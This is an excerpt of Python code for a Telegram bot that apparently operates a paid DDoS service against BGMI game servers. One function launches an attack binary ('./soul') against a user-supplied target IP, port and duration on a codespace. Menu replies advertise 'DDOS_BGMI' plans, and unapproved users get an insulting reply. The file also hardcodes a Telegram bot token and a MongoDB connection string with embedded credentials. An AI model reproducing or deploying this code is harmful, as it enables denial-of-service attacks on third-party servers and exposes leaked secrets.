...
TOKEN = '7457786831:AAGa9lNBOze4BpsFH4Zy2gonkZhKEHbgwWw'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002204097399
CHANNEL_ID = -1002204097399
error_channel_id = -1002204097399
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./soul {target_ip} {target_port} {duration} 180"
    try:
...
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED BSDK*", parse_mode='Markdown')
...
def handle_message(message):
    ...
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/MANTEL_BGMI*", parse_mode='Markdown')
        ...
        bot.reply_to(message, "*DDOS_BGMI*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*Beast_boi69*", parse_mode='Markdown')
    else:
